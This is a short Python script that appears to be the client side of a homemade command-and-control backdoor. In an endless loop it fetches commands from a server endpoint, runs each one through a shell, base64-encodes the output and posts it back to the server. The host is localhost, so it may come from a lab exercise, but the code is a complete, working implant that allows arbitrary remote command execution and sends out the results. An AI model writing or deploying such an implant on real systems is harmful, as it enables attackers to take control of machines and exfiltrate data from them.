# -*- coding: utf-8 -*-
import requests
import subprocess
import base64
import time

server = "https://127.0.0.1:5000"
server2  = "https://127.0.0.1:5000/getCMD"
server3 = "https://127.0.0.1:5000/postOUTPUT"
#we want the client to continue to reach our every 10 seconds
oldCMD = ""
while True:
    getRquest = requests.get(server2,  verify="certs/server.crt")

    cmdToEXEC = getRquest.text.strip()
    print(f"\n[+]Command to exec -> {cmdToEXEC}")
    
    if oldCMD != cmdToEXEC:
        try:
            cmdOUT = subprocess.check_output(cmdToEXEC, shell=True, stderr=subprocess.STDOUT).decode()
            print("\n[+]Command ran")
            encodedOutput = base64.b64encode(cmdOUT.encode('utf-8'))
            postRquest = requests.post(server3, data=encodedOutput, verify="certs/server.crt")
            oldCMD = cmdToEXEC
        except:
            print("error")
    time.sleep(5)